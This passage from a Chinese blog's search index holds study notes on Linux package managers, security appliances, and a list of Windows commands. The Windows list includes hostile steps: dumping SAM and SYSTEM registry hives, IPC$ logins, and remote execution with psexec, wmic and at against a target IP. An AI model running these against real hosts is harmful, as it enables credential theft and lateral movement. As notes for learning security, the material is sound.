            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux软件管理命令</title>
      <link href="/2024/05/25/linux%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/05/25/linux%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="修复依赖包"><a href="#修复依赖包" class="headerlink" title="修复依赖包"></a>修复依赖包</h1><p>sudo apt –fix-broken install</p><h1 id="单机命令"><a href="#单机命令" class="headerlink" title="单机命令"></a>单机命令</h1><h2 id="rpm-与-dbkg"><a href="#rpm-与-dbkg" class="headerlink" title="rpm 与 dbkg"></a>rpm 与 dbkg</h2><p><code>rpm</code>命令用于管理软件。rpm原本是 Red Hat Linux 发行版专门用来管理 Linux   各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux   易于安装，升级，间接提升了 Linux 的适用度。能被<code>rpm</code>命令安装的软件包一般以<code>.rpm</code>为文件后缀。</p><p><code>dpkg</code> 是为”Debian”操作系统专门开发的套件管理系统，用于软件的安装，更新和移除。能被<code>dpkg</code>命令安装的软件包一般以<code>.deb</code>为文件后缀。</p><p><strong>常见命令</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh [package_name]         <span class="comment">#安装软件包，v显示详细信息，h友好显示</span></span><br><span class="line">rpm -evh [package_name]         <span class="comment">#卸载软件</span></span><br><span class="line">rpm -qlp *.rpm                  <span class="comment">#列出rpm包的内容</span></span><br><span class="line">rpm -qa |grep [字符串]           <span class="comment">#在已安装的所有软件中查询包含某字符串的软件版本</span></span><br><span class="line">rpm -ql [软件名]                 <span class="comment">#列出该软件所有文件与目录</span></span><br><span class="line">rpm -qc [软件名]                 <span class="comment">#列出软件的所有设置文件</span></span><br><span class="line">rpm -qR [软件名]                 <span class="comment">#查询某软件的依赖</span></span><br><span class="line">rpm -qf [文件名]                 <span class="comment">#查询文件属于哪个软件包</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -i [package_name]     <span class="comment"># 安装软件包</span></span><br><span class="line">dpkg -r [package_name]     <span class="comment"># 移除软件（保留配置）</span></span><br><span class="line">dpkg -P [package_name]     <span class="comment"># 移除软件（不保留配置）</span></span><br><span class="line">dpkg -c *.deb              <span class="comment"># 列出deb包的内容</span></span><br><span class="line">dpkg -l [软件名]            <span class="comment"># 配合|grep，查找主机包</span></span><br><span class="line">dpkg -s [软件名]            <span class="comment"># 查找包的详细信息</span></span><br><span class="line">dpkg -L [软件名]            <span class="comment"># 查看已安装的软件包，都存在系统哪些文件</span></span><br><span class="line">dpkg -S [文件名]            <span class="comment"># 反查文件属于哪个包</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center"></th><th align="center">rpm</th><th align="center">dpkg</th></tr></thead><tbody><tr><td align="center">安装</td><td align="center">rpm -ivh [package_name]</td><td align="center">dpkg -i [package_name]</td></tr><tr><td align="center">卸载</td><td align="center">rpm -evh [package_name]</td><td align="center">dpkg -r&#x2F;P [package_name]</td></tr><tr><td align="center">列出包的内容</td><td align="center">rpm -qlp *.rpm</td><td align="center">dpkg -c *.deb</td></tr><tr><td align="center">列出所有已安装的包</td><td align="center">rpm -qa</td><td align="center">dpkg -l</td></tr><tr><td align="center">列出该软件所有文件与目录</td><td align="center">rpm -ql [软件名]</td><td align="center">dpkg -L [软件名]</td></tr><tr><td align="center">查询文件属于哪个软件包</td><td align="center">rpm -qf</td><td align="center">dpkg -S [文件名]</td></tr></tbody></table><h1 id="联机命令"><a href="#联机命令" class="headerlink" title="联机命令"></a>联机命令</h1><h2 id="yum-与-apt"><a href="#yum-与-apt" class="headerlink" title="yum 与 apt"></a>yum 与 apt</h2><p><code>apt</code>是一个在Debian中的Shell前端软件包管理器。<code>apt</code>命令提供了查找、安装、升级、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。<code>apt</code>命令执行需要超级管理员权限(root)</p><p><code>yum</code>命令是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。</p><p>基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令。</p><p>参数：</p><ul><li>-y：执行yum或apt-get时加次参数，代表[yes&#x2F;no]时，默认yes，省去中途输入yes的麻烦。</li></ul><p><strong>常见命令</strong> </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum makecache                         <span class="comment">#更新源（安装新源后执行）</span></span><br><span class="line">yum clean all                         <span class="comment">#清除缓存目录（/var/cache/yum）下的软件包及旧的headers</span></span><br><span class="line">yum list |grep                        <span class="comment">#显示所有已经安装和可以安装的程序包</span></span><br><span class="line">yum info [package-name]               <span class="comment">#显示安装包信息</span></span><br><span class="line">yum -y install [package-name]         <span class="comment">#安装软件,默认选yes</span></span><br><span class="line">yum remove [package-name]             <span class="comment">#卸载</span></span><br><span class="line">yum deplist rpm                       <span class="comment">#查看程序rpm依赖情况</span></span><br><span class="line">yum update                            <span class="comment">#更新全部软件包</span></span><br><span class="line">yum group list                        <span class="comment">#列出组</span></span><br><span class="line">yum group install <span class="string">&quot;Security Tools&quot;</span>    <span class="comment">#安装‘Security Tools’软件组</span></span><br><span class="line">yum search                            <span class="comment">#检索安装包</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install      <span class="comment">#安装软件包                </span></span><br><span class="line">apt-get remove       <span class="comment">#仅卸载软件，但是并不卸载配置文件</span></span><br><span class="line">apt-get purge        <span class="comment">#卸载指令，同时卸载相应的配置文件</span></span><br><span class="line">apt-get autoremove   <span class="comment">#卸载软件的时候同时卸载那些当初作为依赖但是现在并不需要的包</span></span><br><span class="line"></span><br><span class="line">apt-get update       <span class="comment">#更新菜单</span></span><br><span class="line">apt-get upgrade      <span class="comment">#更新所有已安装的软件包</span></span><br><span class="line">apt-get dist-upgrade <span class="comment">#自动处理依赖包升级</span></span><br><span class="line"><span class="comment">#upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来。</span></span><br><span class="line"><span class="comment">#dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它。(所以通常这个会被认为是有点风险的升级)</span></span><br><span class="line"></span><br><span class="line">apt-cache search     <span class="comment">#用关键字搜索包</span></span><br><span class="line">apt-cache show       <span class="comment">#显示特定包的基本信息</span></span><br><span class="line">apt-cache depends    <span class="comment">#列出包的依赖</span></span><br><span class="line">apt-get clean        <span class="comment">#清理本地包占用的磁盘空间(/var/cache/apt/archives)</span></span><br><span class="line">apt-get clean all    <span class="comment">#清除菜单，并清除install下载的deb包(/var/cache/apt/archives)</span></span><br></pre></td></tr></table></figure><h2 id="dnf-命令"><a href="#dnf-命令" class="headerlink" title="dnf 命令"></a>dnf 命令</h2><p><code>DNF</code>是新一代的rpm软件包管理器。它正在逐步取代<code>yum</code>命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnf repolist                                       <span class="comment">#该命令用于显示系统中可用的 DNF 软件库</span></span><br><span class="line">dnf repolist all                                   <span class="comment">#该命令用于显示系统中可用和不可用的所有的 DNF 软件库</span></span><br><span class="line">dnf list                                           <span class="comment">#用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包</span></span><br><span class="line">dnf list installed                                 <span class="comment">#该命令用于列出所有安装了的 RPM 包</span></span><br><span class="line">dnf list available                                 <span class="comment">#用于列出来自所有可用软件库的可供安装的软件包</span></span><br><span class="line">dnf search [pakage]                                <span class="comment">#用该命令来搜索软件包</span></span><br><span class="line">dnf provides /bin/bash                             <span class="comment">#查找某一文件的提供者</span></span><br><span class="line">dnf info nano                                      <span class="comment">#查看软件包详情</span></span><br><span class="line">dnf install [pakage]                               <span class="comment">#安装软件包</span></span><br><span class="line">dnf update systemd                                 <span class="comment">#该命令用于升级指定软件包</span></span><br><span class="line">dnf check-update                                   <span class="comment">#该命令用于检查系统中所有软件包的更新</span></span><br><span class="line">dnf update                                         <span class="comment">#该命令用于升级系统中所有有可用升级的软件包</span></span><br><span class="line">dnf remove [pakage]                                <span class="comment">#删除系统中指定的软件包</span></span><br><span class="line">dnf autoremove                                     <span class="comment">#删除无用孤立的软件包</span></span><br><span class="line">dnf clean all                                      <span class="comment">#删除缓存的无用软件包</span></span><br><span class="line">dnf <span class="built_in">history</span>                                        <span class="comment">#查看您系统上 DNF 命令的执行历史</span></span><br><span class="line">dnf grouplist                                      <span class="comment">#该命令用于列出所有的软件包组</span></span><br><span class="line">dnf groupinstall ‘Educational Software’            <span class="comment">#该命令用于安装一个软件包组</span></span><br><span class="line">dnf groupupdate ‘Educational Software’             <span class="comment">#升级一个软件包组中的软件包</span></span><br><span class="line">dnf groupremove ‘Educational Software’             <span class="comment">#该命令用于删除一个软件包组</span></span><br><span class="line">dnf reinstall [pakage]                             <span class="comment">#该命令用于重新安装特定软件包</span></span><br></pre></td></tr></table></figure><h1 id="系统源"><a href="#系统源" class="headerlink" title="系统源"></a>系统源</h1><h2 id="apt-源配置"><a href="#apt-源配置" class="headerlink" title="apt 源配置"></a>apt 源配置</h2><p><code>apt</code>命令更新和安装软件包是从软件安装源中请求的。</p><p>kali系统的源文件在<code>/etc/apt/sources.list</code>。</p><p>常见kali源：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.a/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><h2 id="yum-源配置"><a href="#yum-源配置" class="headerlink" title="yum 源配置"></a>yum 源配置</h2><p>在centos中yum源文件存储在<code>/etc/yum.repos.d/</code>目录中。</p><p>换源需要把原来的 <code>.repos</code> 文件重命名为 <code>.repos.bak</code> 不让系统读取到 repos 结尾的文件，再下载另一个源的 repos 文件即可，想换回来就再次重命名操作一下。</p><p>repo文件的示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[baseos]</span><br><span class="line">name=Rocky Linux $releasever - BaseOS</span><br><span class="line">mirrorlist=https://mirrors.rockylinux.org/mirrorlist?arch=$basearch&amp;repo=BaseOS-$releasever</span><br><span class="line">#baseurl=http://dl.rockylinux.org/$contentdir/$releasever/BaseOS/$basearch/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-rockyofficial</span><br></pre></td></tr></table></figure><p><strong>epel源</strong>是redhat系比较常用的源，它不属于centos，但是它比centos官方源的软件更多、更全。</p><p>EPEL (Extra Packages for Enterprise Linux)是基于Fedora的一个项目，为“红帽系”的操作系统提供额外的软件包，适用于RHEL、CentOS和Scientific Linux.</p><p>安装epel源只需要安装一个叫”epel-release”的软件包，这个软件包会自动配置yum的软件仓库。</p><p>命令为：<code>dnf install -y epel-release</code> </p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务</title>
      <link href="/2024/05/25/linux%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/05/25/linux%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a679ed2c8b7256afb656b8e7380b3610566285dc35c45877f0212c84d8d74044"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些Windows命令</title>
      <link href="/2024/05/25/%E4%B8%80%E4%BA%9BWindows%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/05/25/%E4%B8%80%E4%BA%9BWindows%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="ipconfig-all"><a href="#ipconfig-all" class="headerlink" title="ipconfig &#x2F;all"></a>ipconfig &#x2F;all</h1><p>获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名</p><h1 id="net-time-domain"><a href="#net-time-domain" class="headerlink" title="net time &#x2F;domain"></a>net time &#x2F;domain</h1><p>查看域名、时间</p><h1 id="net-view-domain"><a href="#net-view-domain" class="headerlink" title="net view &#x2F;domain"></a>net view &#x2F;domain</h1><p>查看域内所有共享</p><h1 id="net-view-ip"><a href="#net-view-ip" class="headerlink" title="net view ip"></a>net view ip</h1><p>查看对方局域网内开启了哪些共享</p><h1 id="net-config-workstation"><a href="#net-config-workstation" class="headerlink" title="net config workstation"></a>net config workstation</h1><p>查看域名、机器名等</p><h1 id="net-user-用户名-密码-add"><a href="#net-user-用户名-密码-add" class="headerlink" title="net user 用户名 密码 &#x2F;add"></a>net user 用户名 密码 &#x2F;add</h1><p>建立用户</p><h1 id="net-user-用户名-del"><a href="#net-user-用户名-del" class="headerlink" title="net user 用户名 &#x2F;del"></a>net user 用户名 &#x2F;del</h1><p>删除用户</p><h1 id="net-user-guest-active-yes"><a href="#net-user-guest-active-yes" class="headerlink" title="net user guest &#x2F;active:yes"></a>net user guest &#x2F;active:yes</h1><p>激活guest账户</p><h1 id="net-user-guest-active-no"><a href="#net-user-guest-active-no" class="headerlink" title="net user guest &#x2F;active:no"></a>net user guest &#x2F;active:no</h1><p>关闭guest账户</p><h1 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h1><p>查看账户</p><h1 id="net-user-账户名"><a href="#net-user-账户名" class="headerlink" title="net user 账户名"></a>net user 账户名</h1><p>查看指定账户信息</p><h1 id="net-user-账户名-密码"><a href="#net-user-账户名-密码" class="headerlink" title="net user 账户名 密码"></a>net user 账户名 密码</h1><p>更改密码</p><h1 id="net-user-domain"><a href="#net-user-domain" class="headerlink" title="net user &#x2F;domain"></a>net user &#x2F;domain</h1><p>查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。</p><h1 id="net-user-用户名-domain"><a href="#net-user-用户名-domain" class="headerlink" title="net user 用户名 &#x2F;domain"></a>net user 用户名 &#x2F;domain</h1><p>查看账户信息</p><h1 id="net-group-domain"><a href="#net-group-domain" class="headerlink" title="net group &#x2F;domain"></a>net group &#x2F;domain</h1><p>查看域中的组</p><h1 id="net-group-“domain-admins”-domain"><a href="#net-group-“domain-admins”-domain" class="headerlink" title="net group “domain admins” &#x2F;domain"></a>net group “domain admins” &#x2F;domain</h1><p>查看当前域的管理用户</p><h1 id="query-user"><a href="#query-user" class="headerlink" title="query user"></a>query user</h1><p>查看当前在线的用户</p><h1 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h1><p>查看所有的本地组</p><h1 id="net-localgroup-administrators"><a href="#net-localgroup-administrators" class="headerlink" title="net localgroup administrators"></a>net localgroup administrators</h1><p>查看administrators组中有哪些用户</p><h1 id="net-localgroup-administrators-用户名-add"><a href="#net-localgroup-administrators-用户名-add" class="headerlink" title="net localgroup administrators 用户名 &#x2F;add"></a>net localgroup administrators 用户名 &#x2F;add</h1><p>把用户添加到管理员组中</p><h1 id="net-start"><a href="#net-start" class="headerlink" title="net start"></a>net start</h1><p>查看开启的服务</p><h1 id="net-start-服务名"><a href="#net-start-服务名" class="headerlink" title="net start 服务名"></a>net start 服务名</h1><p>开启某服务</p><h1 id="net-stop-服务名"><a href="#net-stop-服务名" class="headerlink" title="net stop 服务名"></a>net stop 服务名</h1><p>停止某服务</p><h1 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h1><p>查看本地开启的共享</p><h1 id="net-share-ipc"><a href="#net-share-ipc" class="headerlink" title="net share ipc$"></a>net share ipc$</h1><p>开启ipc$共享</p><h1 id="net-share-ipc-del"><a href="#net-share-ipc-del" class="headerlink" title="net share ipc$ &#x2F;del"></a>net share ipc$ &#x2F;del</h1><p>删除ipc$共享</p><h1 id="net-share-c-del"><a href="#net-share-c-del" class="headerlink" title="net share c$ &#x2F;del"></a>net share c$ &#x2F;del</h1><p>删除C：共享</p><h1 id="192-168-0-108-c"><a href="#192-168-0-108-c" class="headerlink" title="\\192.168.0.108\c"></a><code>\\192.168.0.108\c</code></h1><p>在另一台主机的文件夹路径使用此命令，访问192.168.0.108的默认共享c盘，需要关掉192.168.0.108的防火墙。</p><p><code>net use \\192.168.0.108\ipc$ 密码 /u:administrator</code></p><p>使用ipc连接192.168.0.108且以管理员身份登入</p><p><code>dir  \\192.168.0.108\c$</code></p><p>查看192.168.0.108的默认共享c盘</p><p><code>net use \\192.168.0.108\ipc$ /del</code> </p><p>删除连接</p><h1 id="dsquery-server"><a href="#dsquery-server" class="headerlink" title="dsquery server"></a>dsquery server</h1><p>查看所有域控制器</p><h1 id="dsquery-subnet"><a href="#dsquery-subnet" class="headerlink" title="dsquery subnet"></a>dsquery subnet</h1><p>查看域内内子网</p><h1 id="dsquery-group"><a href="#dsquery-group" class="headerlink" title="dsquery group"></a>dsquery group</h1><p>查看域内工作组</p><h1 id="dsquery-site"><a href="#dsquery-site" class="headerlink" title="dsquery site"></a>dsquery site</h1><p>查看域内站点</p><h1 id="netstat-a"><a href="#netstat-a" class="headerlink" title="netstat -a"></a>netstat -a</h1><p>查看开启了哪些端口,常用netstat -an</p><h1 id="netstat-n"><a href="#netstat-n" class="headerlink" title="netstat -n"></a>netstat -n</h1><p>查看端口的网络连接情况，常用netstat -an</p><h1 id="netstat-v"><a href="#netstat-v" class="headerlink" title="netstat -v"></a>netstat -v</h1><p>查看正在进行的工作</p><h1 id="netstat-p"><a href="#netstat-p" class="headerlink" title="netstat -p"></a>netstat -p</h1><p>协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况（查看tcp&#x2F;ip协议使用情况）</p><h1 id="netstat-s"><a href="#netstat-s" class="headerlink" title="netstat -s"></a>netstat -s</h1><p>查看正在使用的所有协议使用情况</p><h1 id="nbtstat-A-ip"><a href="#nbtstat-A-ip" class="headerlink" title="nbtstat -A ip"></a>nbtstat -A ip</h1><p>对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写</p><h1 id="reg-save-hklm-sam-sam-hive"><a href="#reg-save-hklm-sam-sam-hive" class="headerlink" title="reg save hklm\sam sam.hive"></a>reg save hklm\sam sam.hive</h1><p>导出用户组信息、权限配置</p><h1 id="reg-save-hklm-system-system-hive"><a href="#reg-save-hklm-system-system-hive" class="headerlink" title="reg save hklm\system system.hive"></a>reg save hklm\system system.hive</h1><p>导出SYSKEY</p><h1 id="net-use-目标IP-ipc-密码-u-用户名"><a href="#net-use-目标IP-ipc-密码-u-用户名" class="headerlink" title="net use \目标IP\ipc$ 密码 &#x2F;u:用户名"></a>net use \目标IP\ipc$ 密码 &#x2F;u:用户名</h1><p>连接目标机器</p><h1 id="at-目标IP-21-31-c-server-exe"><a href="#at-目标IP-21-31-c-server-exe" class="headerlink" title="at \目标IP 21:31 c:\server.exe"></a>at \目标IP 21:31 c:\server.exe</h1><p>在某个时间启动某个应用</p><h1 id="wmic-node-”目标IP”-password-”123456”-user-”admin”"><a href="#wmic-node-”目标IP”-password-”123456”-user-”admin”" class="headerlink" title="wmic &#x2F;node:”目标IP” &#x2F;password:”123456” &#x2F;user:”admin”"></a>wmic &#x2F;node:”目标IP” &#x2F;password:”123456” &#x2F;user:”admin”</h1><p>连接目标机器</p><h1 id="psexec-exe-目标IP-u-username-p-password-s-cmd"><a href="#psexec-exe-目标IP-u-username-p-password-s-cmd" class="headerlink" title="psexec.exe \目标IP -u username -p password -s cmd"></a>psexec.exe \目标IP -u username -p password -s cmd</h1><p>在目标机器上执行cmd</p><h1 id="finger-username-host"><a href="#finger-username-host" class="headerlink" title="finger username @host"></a>finger username @host</h1><p>查看最近有哪些用户登陆</p><h1 id="route-print"><a href="#route-print" class="headerlink" title="route print"></a>route print</h1><p>显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p><h1 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h1><p>查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。</p><h1 id="arp-a"><a href="#arp-a" class="headerlink" title="arp -a"></a>arp -a</h1><p>将显示出全部信息</p><h1 id="nslookup-IP"><a href="#nslookup-IP" class="headerlink" title="nslookup IP"></a>nslookup IP</h1><p>地址侦测器</p><h1 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h1><p>查看当前进程</p><h1 id="taskkill-pid-PID数"><a href="#taskkill-pid-PID数" class="headerlink" title="taskkill &#x2F;pid PID数"></a>taskkill &#x2F;pid PID数</h1><p>终止指定PID进程</p><h1 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h1><p>查看当前用户及权限</p><h1 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h1><p>查看计算机信息（版本，位数，补丁情况)</p><h1 id="ver"><a href="#ver" class="headerlink" title="ver"></a>ver</h1><p>查看计算机操作系统版本</p><h1 id="tasklist-svc"><a href="#tasklist-svc" class="headerlink" title="tasklist &#x2F;svc"></a>tasklist &#x2F;svc</h1><p>查看当前计算机进程情况</p><h1 id="netstat-ano"><a href="#netstat-ano" class="headerlink" title="netstat -ano"></a>netstat -ano</h1><p>查看当前计算机进程情况</p><h1 id="wmic-product-ins-txt"><a href="#wmic-product-ins-txt" class="headerlink" title="wmic product &gt; ins.txt"></a>wmic product &gt; ins.txt</h1><p>查看安装软件以及版本路径等信息，重定向到ins.txt</p><h1 id="type-ins-txt"><a href="#type-ins-txt" class="headerlink" title="type ins.txt"></a>type ins.txt</h1><p>读取文件内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全设备</title>
      <link href="/2024/05/25/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"/>
      <url>/2024/05/25/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙是一种高级访问控制设备，部署在不同网络安全域之间。它通过相关的安全策略（如允许、拒绝、监视、记录）来控制进出网络的访问行为。防火墙可以阻止恶意流量进入网络，同时还可以防止内部敏感数据外泄。根据实现方式，防火墙可分为包过滤防火墙和应用代理防火墙。</p><h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>Web应用防护系统（Web Application Firewall, 简称：WAF。不同于系统防火墙，是专门服务于网站的web防火墙。</p><p>Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p>WAF工作在应用层。</p><p>WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>对于系统自身安全相关的下列事件产生审计记录：</p><p>（1）管理员登录后进行的操作行为；</p><p>（2） 对安全策略进行添加、修改、删除等操作行为；</p><p>（3） 对管理角色进行增加、删除和属性修改等操作行为；</p><p>（4） 对其他安全功能配置参数的设置或更新等行为。</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>用来控制对Web应用的访问，既包括<code>主动安全模式</code>也包括<code>被动安全模式</code>。</p><h3 id="架构及网络设计"><a href="#架构及网络设计" class="headerlink" title="架构及网络设计"></a>架构及网络设计</h3><p>当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p><h3 id="WEB应用加固"><a href="#WEB应用加固" class="headerlink" title="WEB应用加固"></a>WEB应用加固</h3><p>这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且 能够保护WEB应用编程错误导致的安全隐患。</p><p><strong>需要指出的是，并非每种被称为Web应用防火墙的设备都同时具有以上四种功能。</strong></p><p>同时WEB应用防火墙还具有多面性的特点。比如从网络入侵检测的角度来看可以把WAF看成运行在HTTP层上的IDS设备。</p><h1 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h1><p>入侵检测系统（intrusion detection system）是一种用于检测网络或系统是否遭受攻击的监控系统。IDS通过软件、硬件对网络或系统的运行状况进行监视，尽可能地发现各种攻击企图、攻击行为或攻击结果。IDS可以分为实时入侵检测和事后入侵检测两类。</p><h1 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h1><p>Intrusion Prevention System入侵预防系统是一种更为主动的网络安全防护措施。IPS不仅检测已知的攻击行为，而且基于已知的攻击行为模式来预测和阻止可能的攻击。IPS可以实时中断、调整或隔离一些不正常或具有伤害性的网络资料传输行为。与IDS相比，IPS更注重预防，而不是仅仅检测攻击。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><ol><li>工作范围：WAF工作在应用层，专注于Web应用的安全；而防火墙工作在网络层，涉及更广泛的网络安全防护。</li><li>防御方式：IDS主要用于检测攻击行为；IPS则不仅检测攻击行为，还进行主动防御。</li><li>部署方式：WAF通常串联部署在应用程序前端；防火墙既可以串联部署也可以旁路部署；IDS通常旁路部署在网络中，用于监控流量；而IPS既可以串联部署也可以旁路部署。</li><li>功能差异：WAF专注于Web应用安全防护；防火墙则提供更全面的网络安全防护；IDS侧重于攻击检测；而IPS更强调预防攻击的功能。</li></ol><p><img src="/img/image-20240519174134150.png" alt="image-20240519174134150"></p><p><a href="https://cloud.tencent.com/developer/article/2238853">IPS vs IDS vs Firewall vs WAF，它们之间有什么区别与联系？-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/05/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/05/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c6edb29dcff6a85a91906d96d58f9bd49df63b3e0c40da1d42796ea97d55bf76"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记</title>
      <link href="/2024/05/25/%E6%9D%82%E8%AE%B0/"/>
      <url>/2024/05/25/%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2b0734e0d262310257ccdfa2f0b4feaabd4f15dcefabe7c55bea733f95e81630"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络模型</title>
      <link href="/2024/05/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
